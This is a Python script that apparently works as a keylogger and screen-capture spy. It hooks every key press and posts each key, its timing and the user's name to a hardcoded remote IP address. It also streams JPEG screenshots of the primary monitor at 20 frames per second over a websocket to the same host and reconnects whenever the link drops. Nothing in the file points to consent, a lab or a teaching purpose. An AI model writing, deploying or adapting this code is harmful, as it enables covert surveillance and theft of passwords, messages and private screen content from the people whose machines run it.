import keyboard
import os
from pathlib import Path
import time
import threading
import json
import requests
import asyncio
import websockets
import mss
import cv2
import numpy as np
import random

name = os.environ["USERNAME"]
id = ""
for i in range(5):
    id += str(random.randint(0 , 9))

now = time.perf_counter()
PORT = 8000
IP = "162.35.28.211"
# IP = "192.168.1.139"



def on_json_text(event):
    global now
    global name
    global id

    current = time.perf_counter()
    gap = current - now
    now = current

    
    data = {
        "key": event.name,
        "time": gap,
        "name" : name + id
    }
    
    response = requests.post(
        f"http://{IP}:{PORT}/keys",
        data
    )

    print(data)

# SERVER = f"ws://{IP}:{PORT}/screen"
SERVER = f"ws://{IP}:{PORT}/screen?id={id}&name={name}"

FPS = 20
JPEG_QUALITY = 80


async def capture_screen():

    with mss.mss() as sct:

        monitor = sct.monitors[1]

        print(
            "Screen:",
            monitor["width"],
            "x",
            monitor["height"]
        )

        while True:
            try:
                print("Trying to connect to server...")

                async with websockets.connect(
                    SERVER,
                    max_size=None
                ) as ws:
                    print("Connected to server!")

                    while True:
                        start_time = time.perf_counter()
                        screenshot = sct.grab(monitor)
                        frame = np.array(screenshot)
                        frame = cv2.cvtColor(
                            frame,
                            cv2.COLOR_BGRA2BGR
                        )

                        success, encoded = cv2.imencode(
                            ".jpg",
                            frame,
                            [
                                cv2.IMWRITE_JPEG_QUALITY,
                                JPEG_QUALITY
                            ]
                        )

                        if not success:
                            continue

                        try:
                            # await ws.send(encoded.tobytes())
                            timestamp = time.perf_counter() - start_time

                            header = json.dumps({"timestamp": timestamp}).encode()
                            jpeg = encoded.tobytes()

                            await ws.send(
                                len(header).to_bytes(4, "big") + header + jpeg
                            ) 
                        except (
                            websockets.ConnectionClosed,
                            ConnectionError,
                            OSError
                        ):

                            print("Server connection lost")
                            break

                        await asyncio.sleep(1 / FPS)

            except (
                ConnectionRefusedError,
                websockets.WebSocketException,
                OSError
            ):

                print(
                    "Server unavailable. "
                    "Retrying in 3 seconds..."
                )

                await asyncio.sleep(3)


def run_screen_capture():
    asyncio.run(capture_screen())




keyboard.on_press(on_json_text)
# keyboard.on_press(on_text)

# SendData()
run_screen_capture()
keyboard.wait()

